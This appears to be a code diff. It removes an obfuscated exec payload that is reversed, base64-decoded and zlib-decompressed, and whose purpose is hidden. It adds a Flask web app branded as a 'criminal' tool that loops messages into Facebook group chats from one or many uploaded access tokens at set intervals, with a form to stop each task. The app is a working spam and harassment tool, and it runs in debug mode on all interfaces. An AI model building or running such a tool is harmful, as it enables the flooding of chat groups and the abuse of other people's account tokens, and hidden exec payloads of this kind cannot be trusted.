@@ -1,6 +1,214 @@
-# encode; tricker seerat brand 
-# Obfuscated with PyObfuscate
-# https://wa.me/+919229137744
-# Time : Wed Oct  2 01:02:04 2024
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from flask import Flask, request, render_template_string
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+
+app = Flask(__name__)
+app.debug = True
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+stop_events = {}
+threads = {}
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'Task started with ID: {task_id}'
+
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>R͟O͟Y͟A͟L͟ P͟U͟N͟J͟A͟B͟ R͟U͟L͟E͟X͟ </title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-color: black; /* Optional: to make the video stand out */
+    }
+    .video-background {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: translate(-50%, -50%);
+      z-index: -1;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      border: none;
+      color: white;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: white;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
+</head>
+<body>
+    <video id="bg-video" class="video-background" loop autoplay muted>
+        <source src="https://raw.githubusercontent.com/HassanRajput0/Video/main/lv_0_20241003034048.mp4">
+        Your browser does not support the video tag.
+    </video>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3 text-white">S͟E͟E͟R͟A͟T͟ B͟R͟A͟N͟D͟</h1> </header>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">SLECT TOKEN OPCTION</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Multy Token</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">ENTER SINGLE TOKEN</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">ENTER TOKEN FILE</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">ENTER GROUP INBOX LINK</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">ENTER KIDX NAME</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">ENTER TIME IN SECOND</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">ENTER TEXT FILE</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">ENTER TASK ID TO STOUP</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>© 2025 CREDIT:- CRIMINAL S33R9T BRAND</p>
+    <p> ROYAL PUNJAB RULEX<a href="">CLICK HERE FOR FACEBOOK</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/qr/IOHRLKBMBPOJA1" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
